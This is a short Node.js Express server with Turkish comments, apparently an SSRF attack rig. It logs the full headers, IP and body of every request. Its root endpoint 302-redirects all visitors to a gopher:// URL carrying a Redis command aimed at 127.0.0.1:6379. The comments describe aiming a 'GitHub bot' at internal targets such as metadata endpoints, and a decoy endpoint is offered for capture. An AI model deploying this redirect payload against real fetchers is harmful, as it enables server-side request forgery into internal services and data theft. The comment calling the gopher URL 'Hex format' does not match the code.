const express = require('express');
const app = express();
const PORT = process.env.PORT || 3000;

// Body parser middleware'leri
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// Gelen tüm istekleri detaylıca loglayan middleware
app.use((req, res, next) => {
    const timestamp = new Date().toISOString();
    const clientIp = req.headers['cf-connecting-ip'] || req.headers['x-forwarded-for'] || req.socket.remoteAddress;
    
    console.log('\n' + '='.repeat(50));
    console.log(`[${timestamp}] YENİ İSTEK YAKALANDI! 🚀`);
    console.log('='.repeat(50));
    console.log(`Method     : ${req.method}`);
    console.log(`URL        : ${req.url}`);
    console.log(`Real IP    : ${clientIp}`);
    console.log(`User-Agent : ${req.headers['user-agent'] || 'Bilinmiyor'}`);
    console.log('--- TÜM HEADERS ---');
    console.log(JSON.stringify(req.headers, null, 2));
    
    if (Object.keys(req.query).length > 0) {
        console.log('--- QUERY PARAMETRELERİ ---');
        console.log(JSON.stringify(req.query, null, 2));
    }
    
    if (req.body && Object.keys(req.body).length > 0) {
        console.log('--- BODY ---');
        console.log(JSON.stringify(req.body, null, 2));
    }
    console.log('-'.repeat(50));
    
    next();
});

// ==========================================
// TEST ENDPOINTLERİ
// ==========================================

// 1. Ana Sayfa: GitHub botunu veya istekleri istediğin adrese fırlatmak için
app.all('/', (req, res) => {
    // Test etmek istediğin hedefi buraya yazabilirsin:
    // Örn: Standart IP, Decimal IP, Hex IP veya Metadata / Gopher denemeleri
    const targetUrl = 'gopher://127.0.0.1:6379/_INFO%0d%0a'; // 127.0.0.1 (Hex formatı)
    
    console.log(`[!] Yönlendiriliyor ➔ Hedef: ${targetUrl}`);
    
    // 302 Found ile hedef adrese yönlendir
    return res.redirect(302, targetUrl);
});

// 2. Özel Yakalama Endpoint'i (Görsel veya dosya süsü vermek istersen)
app.all('/yakalandi', (req, res) => {
    res.status(200).send('<h1>Hedef başarıyla yakalandı ve loglandı!</h1>');
});

// Sunucuyu başlat
app.listen(PORT, () => {
    console.log(`🔥 Lab sunucusu ${PORT} portunda aktif ve avını bekliyor...`);
});
